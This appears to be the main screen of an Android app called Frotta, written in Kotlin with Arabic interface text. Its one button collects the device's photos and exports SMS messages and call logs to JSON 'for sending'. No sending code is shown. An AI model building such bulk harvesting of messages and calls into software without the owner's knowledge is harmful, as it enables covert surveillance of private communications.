package com.frotta

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.frotta.transfer.DataExporter
import com.frotta.transfer.MediaOrganizer

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            Surface(
                modifier = Modifier.fillMaxSize(),
                color = MaterialTheme.colorScheme.background
            ) {
                Column(
                    modifier = Modifier.fillMaxSize().padding(16.dp),
                    verticalArrangement = Arrangement.Center,
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(text = "مرحباً بك في تطبيق Frotta", style = MaterialTheme.typography.headlineMedium)
                    Spacer(modifier = Modifier.height(24.dp))
                    Button(onClick = {
                        // اختبار سحب الصور والمكالمات
                        val media = MediaOrganizer.getDeviceMedia(applicationContext)
                        val backupFile = DataExporter.exportSmsAndCallsToJson(applicationContext)
                    }) {
                        Text(text = "تجهيز البيانات للإرسال")
                    }
                }
            }
        }
    }
}
